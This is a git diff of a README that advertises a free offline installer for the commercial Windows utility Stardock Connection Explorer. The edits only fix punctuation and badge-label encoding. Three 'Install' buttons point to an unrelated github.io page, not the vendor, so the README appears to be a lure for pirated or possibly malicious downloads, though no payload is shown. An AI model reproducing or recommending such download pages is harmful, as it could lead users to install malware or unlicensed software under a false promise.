@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Network+Browser-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Stardock Connection Explorer Free Installer** — Stardock Connection Explorer is a Windows utility that makes it easier to access and manage network shares, cloud storage, and remote connections from a single Explorer-integrated interface with quick-access shortcuts and connection bookmarks.. Works without internet access, no account required. Full offline installation.
+**💻 Stardock Connection Explorer Free Installer** — Stardock Connection Explorer is a Windows utility that makes it easier to access and manage network shares, cloud storage, and remote connections from a single Explorer-integrated interface with quick-access shortcuts and connection bookmarks. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Stardock Connection Explorer](https://img.shields.io/badge/⬇_Install_Stardock%20Connection%20Explorer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Stardock Connection Explorer](https://img.shields.io/badge/⬇_Install_Stardock+Connection+Explorer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Stardock Connection Explorer is a Windows utility that makes it easier to access
 
 <div align="center">
 
-[![⬇ Install Stardock Connection Explorer](https://img.shields.io/badge/⬇_Install_Stardock%20Connection%20Explorer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Stardock Connection Explorer](https://img.shields.io/badge/⬇_Install_Stardock+Connection+Explorer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Stardock Connection Explorer is a Windows utility that makes it easier to access
 
 ---
 
-**Stardock Connection Explorer Free Installer** — Stardock Connection Explorer is a Windows utility that makes it easier to access and manage network shares, cloud storage, and remote connections from a single Explorer-integrated interface with quick-access shortcuts and connection bookmarks.. Install without internet connection today!
+**Stardock Connection Explorer Free Installer** — Stardock Connection Explorer is a Windows utility that makes it easier to access and manage network shares, cloud storage, and remote connections from a single Explorer-integrated interface with quick-access shortcuts and connection bookmarks. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Stardock Connection Explorer](https://img.shields.io/badge/⬇_Install_Stardock%20Connection%20Explorer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Stardock Connection Explorer](https://img.shields.io/badge/⬇_Install_Stardock+Connection+Explorer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
